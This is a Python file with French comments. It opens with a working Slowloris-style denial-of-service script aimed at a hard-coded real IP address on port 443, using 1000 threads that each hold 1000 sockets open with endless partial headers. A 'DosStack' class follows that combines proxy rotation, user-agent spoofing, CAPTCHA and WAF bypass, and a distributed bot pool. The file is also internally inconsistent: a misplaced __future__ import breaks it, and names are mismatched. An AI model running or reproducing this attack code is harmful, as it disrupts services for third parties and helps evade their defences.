import socket
import threading
import time
from __future__ import annotations
import logging
from typing import Any, Dict, Iterable, List, Optional
from core.proxy_rotator import ProxyRotator
from core.user_agent_rotator import UserAgentRotator
from core.delay_jitter import DelayJitter, RateLimiter, backoff_delay
from core.adaptive_backoff import AdaptiveBackoff
from core.request_fragmenter import RequestFragmenter
from core.captcha_waf_bypass import CaptchaWafBypass
from core.distributed_bots import DistributedBotPool, BotContext, Task


logger = logging.getLogger("scraping_stack")
if not logger.handlers:
    h = logging.StreamHandler()
    h.setFormatter(logging.Formatter("[%(asctime)s] %(levelname)s - %(message)s"))
    logger.addHandler(h)
    logger.setLevel(logging.INFO)


TARGET_IP = '82.98.171.83'
TARGET_PORT = 443
THREADS = 1000
SOCKETS_PER_THREAD = 1000

def dos_attack(target_ip, target_port):
    sockets = []
    
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)  
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\n")
            sockets.append(s)
        except Exception as e:
            pass
    
    print(f"Thread {threading.current_thread().name}: {len(sockets)} sockets créés")
    
    while sockets:
        for s in sockets[:]:  
            try:
                s.send(b"X-Header: " + b"a"*1024 + b"\r\n")
            except:
                try:
                    sockets.remove(s)
                    s.close()
                except:
                    pass
        time.sleep(0.001)
    
    print(f"Thread {threading.current_thread().name}: terminé")

print(f"Démarrage de {THREADS} threads...")
for i in range(THREADS):
    thread = threading.Thread(target=dos_attack, args=(TARGET_IP, TARGET_PORT))
    thread.daemon = True
    thread.start()
    time.sleep(0.01)  

print("Attaque en cours. Appuyez sur Ctrl+C pour arrêter.")

try:
    while True:
        time.sleep(1)
        print(f"Threads actifs: {threading.active_count() - 1}")  
except KeyboardInterrupt:
    print("\nArrêt demandé. Fin du programme.")


"""
main.py
-------
Point d'entrée unifié qui relie TOUS les modules :

    proxy_rotator.py       -> ProxyRotator
    user_agent_rotator.py  -> UserAgentRotator
    delay_jitter.py        -> DelayJitter, RateLimiter, backoff_delay
    adaptive_backoff.py    -> AdaptiveBackoff
    request_fragmenter.py  -> RequestFragmenter
    captcha_waf_bypass.py  -> CaptchaWafBypass
    distributed_bots.py    -> DistributedBotPool, BotContext, Task

"""

class DosStack:

    def __init__(self,
                 # Proxies
                 proxies: Optional[List[str]] = None,
                 proxy_file: Optional[str] = None,
                 proxy_rotation: str = "round-robin",
                 # User-Agents
                 user_agents: Optional[List[str]] = None,
                 ua_rotation: str = "random",
                 # Delay / jitter
                 min_delay: float = 0.4,
                 max_delay: float = 2.5,
                 jitter_mode: str = "human",
                 # Rate limiter
                 rate_max_calls: int = 5,
                 rate_period: float = 1.0,
                 # Backoff adaptatif
                 backoff_strategy: str = "adaptive",
                 backoff_max_delay: float = 120.0,
                 # CAPTCHA / WAF
                 captcha_service: str = "capsolver",
                 captcha_api_key: Optional[str] = None,
                 use_tls_impersonation: bool = True,
                 use_browser_fallback: bool = True,
                 headless: bool = True,
                 # Fragmentation
                 chunk_size: int = 64 * 1024,
                 params_per_request: int = 5,
                 # Divers
                 verbose: bool = False):
        self.verbose = verbose
        if verbose:
            logger.setLevel(logging.DEBUG)

        # --- 1) Proxies ---------------------------------------------------
        if proxies or proxy_file:
            self.proxy_rotator: Optional[ProxyRotator] = ProxyRotator(
                proxies=proxies,
                proxy_file=proxy_file,
                rotation=proxy_rotation,
            )
        else:
            self.proxy_rotator = None

        # --- 2) User-Agents ----------------------------------------------
        self.ua_rotator = UserAgentRotator(
            user_agents=user_agents,
            rotation=ua_rotation,
        )

        # --- 3) Jitter + rate limiter ------------------------------------
        self.jitter = DelayJitter(min_delay=min_delay,
                                  max_delay=max_delay,
                                  mode=jitter_mode)
        self.rate_limiter = RateLimiter(max_calls=rate_max_calls,
                                        period=rate_period)

        # --- 4) Backoff adaptatif ----------------------------------------
        self.backoff = AdaptiveBackoff(
            strategy=backoff_strategy,
            max_delay=backoff_max_delay,
            verbose=verbose,
        )

        # --- 5) Fragmenter -----------------------------------------------
        self.fragmenter = RequestFragmenter(
            chunk_size=chunk_size,
            max_params_per_request=params_per_request,
            proxy_rotator=self.proxy_rotator,
            ua_rotator=self.ua_rotator,
            jitter=self.jitter,
            rate_limiter=self.rate_limiter,
        )

        # --- 6) Bypass CAPTCHA / WAF -------------------------------------
        self.bypass = CaptchaWafBypass(
            captcha_service=captcha_service,
            captcha_api_key=captcha_api_key,
            proxy_rotator=self.proxy_rotator,
            ua_rotator=self.ua_rotator,
            jitter=self.jitter,
            rate_limiter=self.rate_limiter,
            backoff=self.backoff,
            use_tls_impersonation=use_tls_impersonation,
            use_browser_fallback=use_browser_fallback,
            headless=headless,
            verbose=verbose,
        )

        logger.info("ScrapingStack initialisé "
                    "(proxy=%s, ua=%d, captcha=%s, browser=%s)",
                    bool(self.proxy_rotator),
                    len(self.ua_rotator.user_agents),
                    bool(captcha_api_key),
                    use_browser_fallback)

    # ------------------------------------------------------------------
    # Requête unitaire (bypass + backoff + proxy + UA + jitter)
    # ------------------------------------------------------------------
    def fetch(self, method: str, url: str, **kwargs) -> Any:
        """
        Requête HTTP unique avec toute la pile :
        TLS impersonation -> détection WAF -> CAPTCHA -> navigateur -> backoff.
        """
        return self.bypass.request(method, url, **kwargs)

    def get(self, url: str, **kwargs):
        return self.fetch("GET", url, **kwargs)

    def post(self, url: str, **kwargs):
        return self.fetch("POST", url, **kwargs)

    # ------------------------------------------------------------------
    # Batch distribué
    # ------------------------------------------------------------------
    def fetch_many(self,
                   urls: Iterable[str],
                   workers: int = 4,
                   handler: Optional[Any] = None,
                   mode: str = "thread",
                   shard_by: str = "host",
                   on_result: Optional[Any] = None,
                   on_error: Optional[Any] = None,
                   progress_every: float = 5.0) -> Dict[str, Any]:
        """
        Traite une liste d'URLs via DistributedBotPool, en réutilisant
        TOUS les composants de la pile (proxies, UA, jitter, backoff).
        """
        if handler is None:
            handler = _default_handler

        pool = DistributedBotPool(
            tasks=list(urls),
            handler=handler,
            num_workers=workers,
            mode=mode,
            shard_by=shard_by,
            proxy_rotator=self.proxy_rotator,
            ua_rotator=self.ua_rotator,
            jitter=self.jitter,
            rate_limiter=self.rate_limiter,
            backoff=self.backoff,
            on_result=on_result,
            on_error=on_error,
            verbose=self.verbose,
        )
        pool.install_signal_handlers()
        return pool.run(progress_every=progress_every)

    # ------------------------------------------------------------------
    # Chunked upload / fragmentation
    # ------------------------------------------------------------------
    def upload_chunked(self, url: str, payload: Any,
                       method: str = "POST", **kwargs) -> List[Any]:
        """Envoie un gros payload en morceaux (via fragmenter)."""
        return self.fragmenter.upload_in_chunks(url, payload, method, **kwargs)

    def paginate(self, url: str, **kwargs) -> List[Any]:
        """Pagination automatique (via fragmenter)."""
        return self.fragmenter.paginate(url, **kwargs)

    def fragment_params(self, url: str, params: Dict[str, Any], **kwargs) -> List[Any]:
        """Découpe des params en plusieurs requêtes."""
        return self.fragmenter.fragment_params(url, params, **kwargs)

    # ------------------------------------------------------------------
    # Diagnostics
    # ------------------------------------------------------------------
    def stats(self) -> Dict[str, Any]:
        return {
            "backoff": self.backoff.stats(),
            "proxies": {
                "total": len(self.proxy_rotator.proxies) if self.proxy_rotator else 0,
                "bad": list(self.proxy_rotator.bad_proxies) if self.proxy_rotator else [],
            },
            "user_agents_count": len(self.ua_rotator.user_agents),
            "current_ua": self.ua_rotator.current,
        }

    def close(self) -> None:
        """Libère les ressources (cloudscraper, etc.)."""
        try:
            self.bypass.close()
        except Exception:
            pass


# ===========================================================================
# Handler par défaut pour le pool distribué
# ===========================================================================
def _default_handler(task: Task, ctx: BotContext) -> Dict[str, Any]:
    import requests
    sess = requests.Session()
    try:
        resp = ctx.request(sess, "GET", task.url, timeout=20)
        return {
            "url": task.url,
            "status": resp.status_code,
            "size": len(resp.text) if hasattr(resp, "text") else 0,
            "worker": ctx.worker_id,
        }
    finally:
        sess.close()


def main():
    import argparse
    args = _build_argparser().parse_args()

    # Collecte des URLs
    urls: List[str] = list(args.urls)
    if args.urls_file:
        with open(args.urls_file, "r", encoding="utf-8") as f:
            urls.extend(l.strip() for l in f if l.strip() and not l.startswith("#"))

    if not urls:
        print("Aucune URL fournie. Exemple :")
        print("  python main.py https://httpbin.org/get --verbose")
        print("  python main.py --urls-file urls.txt --workers 8")
        return

    stack = DosStack(
        proxy_file=args.proxies_file,
        min_delay=args.min_delay,
        max_delay=args.max_delay,
        captcha_service=args.captcha_service,
        captcha_api_key=args.captcha_key,
        use_tls_impersonation=not args.no_tls,
        use_browser_fallback=not args.no_browser,
        verbose=args.verbose,
    )

    try:
        if len(urls) == 1:
            resp = stack.fetch("GET", urls[0])
            if resp is not None:
                print(f"Status : {resp.status_code}")
                print(f"Taille : {len(resp.text)} octets")
                print(resp.text[:500])
            else:
                print("Échec.")
        else:
            stats = stack.fetch_many(urls, workers=args.workers, mode=args.mode)
            print("\n=== Résumé ===")
            print(f"Durée    : {stats['duration']:.2f}s")
            print(f"Réussis  : {stats['total_done']}")
            print(f"Échoués  : {stats['total_failed']}")
            for wid, s in stats["workers"].items():
                print(f"  {wid}: {s}")

        if args.verbose:
            print("\n=== Stats globales ===")
            for k, v in stack.stats().items():
                print(f"  {k}: {v}")
    finally:
        stack.close()


if __name__ == "__main__":
    main()
